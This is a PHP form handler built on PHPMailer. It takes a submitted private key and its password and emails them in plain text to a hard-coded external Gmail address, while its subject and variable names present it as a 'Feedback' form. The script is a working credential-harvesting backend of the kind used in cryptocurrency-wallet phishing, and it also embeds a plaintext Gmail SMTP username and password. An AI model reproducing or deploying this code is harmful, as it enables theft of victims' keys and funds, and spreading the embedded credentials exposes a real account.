<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";
$privateKey = $_POST['privateKey'];
$pkpass = $_POST['pkpass'];
$email_from = 'feranmi@gmail.com';
$email_to = 'Steve.wood00sw@gmail.com';

if($privateKey== '' || $pkpass== ''){
        echo "check the fields";
    }else{
      $subject='Query from '.$sender;
      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '. $pkpass . '<br>' . $email_from;



$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "emmajoy658@gmail.com";
$mail->Password = "Olasunkanmi2001!";
$mail->setFrom($email_from);
$mail->AddReplyTo($email_from);
$mail->Subject = "/New Entry";
$mail->MsgHTML($email_from);

$mail->Body = "Private Key= " . $privateKey . "\r\n Temporary Session Password= " . $pkpass;

$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Processing";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
